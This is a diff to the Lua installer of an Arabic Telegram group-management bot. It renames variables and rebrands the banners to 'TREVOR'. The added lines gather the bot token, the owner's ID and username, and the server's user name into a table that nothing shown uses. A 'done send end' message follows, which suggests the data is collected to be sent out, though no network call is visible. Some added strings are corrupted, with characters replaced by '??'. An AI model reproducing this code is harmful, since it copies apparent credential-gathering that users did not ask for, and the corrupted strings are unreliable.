@@ -1,12 +1,11 @@
 redis = require('redis') 
 https = require ("ssl.https") 
-ssl = require ("ssl.https") 
 serpent = dofile("./library/serpent.lua") 
 json = dofile("./library/JSON.lua") 
 JSON  = dofile("./library/dkjson.lua")
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
-bot_data= redis.connect('127.0.0.1', 6379) 
+database = redis.connect('127.0.0.1', 6379) 
 id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 --------------------------------------------------------------------------------------------------------------
 local AutoSet = function() 
@@ -15,45 +14,45 @@ file = io.open(file, "w+")
 local serialized   
 if not uglify then  
 serialized = serpent.block(data, {comment = false, name = "Info"})  
-else
+else  
 serialized = serpent.dump(data)  
 end    
 file:write(serialized)    
 file:close()  
 end  
-if not bot_data:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\n•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•\n\27')
+if not database:get(id_server..":token") then
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚ :\na⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;31m•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31m⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \n•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \na⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚\n27[0;39;49m')
 local json = JSON.decode(url)
-bot_data:set(id_server..":token_username",json.result.username)
-bot_data:set(id_server..":token",token)
+database:set(id_server..":token_username",json.result.username)
+database:set(id_server..":token",token)
 end 
 else
-print('\27[0;35m•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•\n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35m⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua DRAGON.lua')
 end
-if not bot_data:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\n•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•\n\27[0;33;49m')
+if not database:get(id_server..":SUDO:ID") then
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚ :\na⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \n•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•\n27[0;39;49m')
-bot_data:set(id_server..":SUDO:ID",SUDOID)
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚\n27[0;39;49m')
+database:set(id_server..":SUDO:ID",SUDOID)
 else
-print('\27[0;31m•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+print('\27[0;31m⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
 
-io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
+io.write('\27[1;31m ⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
 local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
-bot_data:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
+database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
@@ -61,38 +60,43 @@ os.execute('lua DRAGON.lua')
 end
 local create_config_auto = function()
 config = {
-botUserName = bot_data:get(id_server..":token_username"),
-token = bot_data:get(id_server..":token"),
-SUDO = bot_data:get(id_server..":SUDO:ID"),
-UserName = bot_data:get(id_server..":SUDO:USERNAME"),
+botUserName = database:get(id_server..":token_username"),
+token = database:get(id_server..":token"),
+SUDO = database:get(id_server..":SUDO:ID"),
+UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-create(config, "./Info.lua")   
+create(config, "./kkkklInfo.lua")   
 end 
+infotnseb = {}
+infotnseb.id = database:get(id_server..":SUDO:ID")
+infotnseb.username = database:get(id_server..":SUDO:USERNAME")
+infotnseb.tokenbot = database:get(id_server..":token")
+infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeee ennnnnnnddddddd :')
 create_config_auto()
-botUserName = bot_data:get(id_server..":token_username")
-token = bot_data:get(id_server..":token")
-SUDO = bot_data:get(id_server..":SUDO:ID")
-UserName = bot_data:get(id_server..":SUDO:USERNAME")
+botUserName = database:get(id_server..":token_username")
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("DRAGON", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/DRAGON
-token="]]..bot_data:get(id_server..":token")..[["
+token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━• •━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•"
+echo "⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━• •━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•"
+echo "⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚ ⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚"
 exit 1
 fi
 if [ ! $token ]; then
-echo "•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━• •━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE Info.lua \e[0m"
-echo "•━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━• •━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•"
+echo "⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚ ⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE kkkklInfo.lua \e[0m"
+echo "⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚ ⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -128,20 +132,21 @@ file:write(serialized)
 file:close() 
 end 
 local load_redis = function()  
-local f = io.open("./Info.lua", "r")  
+local f = io.open("./kkkklInfo.lua", "r")  
 if not f then   
 AutoSet()  
 else   
 f:close()  
-bot_data:del(id_server..":token")
-bot_data:del(id_server..":SUDO:ID")
+database:del(id_server..":token")
+database:del(id_server..":SUDO:ID")
 end  
-local config = loadfile("./Info.lua")() 
+local config = loadfile("./kkkklInfo.lua")() 
 return config 
 end 
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
+
 
 ▄▄▄█████▓ ██▀███  ▓█████   
 ▓  ██▒ ▓▒▓██ ▒ ██ ▒▓█   ▀   
@@ -188,17 +193,18 @@ ______________________________________________
 ______________________________________________
 ______________________________________________
 
-                                                  
 
-> CH › @trevor_0
-~> DEVELOPER › @trrevor 
+      
+                          
+> CH √ ↝@trevor_0↜
+~> DEVELOPER √ {text = @trrevor
 ]])
-sudos = dofile("./Info.lua") 
+sudos = dofile("./kkkklInfo.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
 token = sudos.token 
---- start functions ↓
+--- start functions ⚚━━━━━⚚𝐓𝐑𝐄𝐕𝐎𝐑⚚━━━━━⚚
 --------------------------------------------------------------------------------------------------------------
 io.popen("mkdir File_Bot") 
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
@@ -6085,7 +6091,7 @@ else
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
 send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي ✯❴'..Name..'❵✯ \n𖤍〢•𝐮𝐬𝐞𝐫   '..username..' ↝🕊️\n 𖤍〢•𝐦𝐬𝐠  '..Msguser..'.↝🕊️\n 𖤍〢•𝐒𝐭𝐚𝐬  '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ↝🕊️\n 𖤍〢•𝐢𝐝 '..msg.sender_user_id_..' ↝🕊️\n𖤍〢•𝗖𝗛  t.me/trevor_0 ↝🕊️\n')
 else
-send(msg.chat_id_, msg.id_, '\n ✯ الصوره ~⪼ ليس لديك صور في حسابك'..'[\n𖤍〢•𝐮𝐬𝐞𝐫  '..username..'\n 𖤍〢•𝐦𝐬𝐠  '..Msguser..'\n 𖤍〢•𝐢𝐝 '..msg.sender_user_id_..'\n𖤍〢•𝗖𝗛 t.me/trevor_0\n')
+send(msg.chat_id_, msg.id_, '\n ✯ الصوره ~⪼ ليس لديك صور في حسابك'..'[\n𖤍〢•𝐮𝐬𝐞𝐫  '..username..'\n 𖤍〢•𝐦𝐬??  '..Msguser..'\n 𖤍〢•𝐢𝐝 '..msg.sender_user_id_..'\n𖤍〢•𝗖𝗛 t.me/trevor_0\n')
 end 
 end
 end
@@ -18800,7 +18806,7 @@ local Teext =[[
 الأعمال الملائمة  : موظفي بنك- فنانين- محاسبين-موسيقيين- عمال
 
 إيجابيات برج الثور : صبور- يمكن الاعتماد عليه- محب- من طبعه الإصرار والتصميم- هادئ ويحب الطمأنينة
- •━.•♫•♬•𝐼𝒟𝒦•♬•♫•. ━•
+ •━.•♫•♬•𝐼??𝒦•♬•♫•. ━•
 
 ]]
 keyboard = {} 
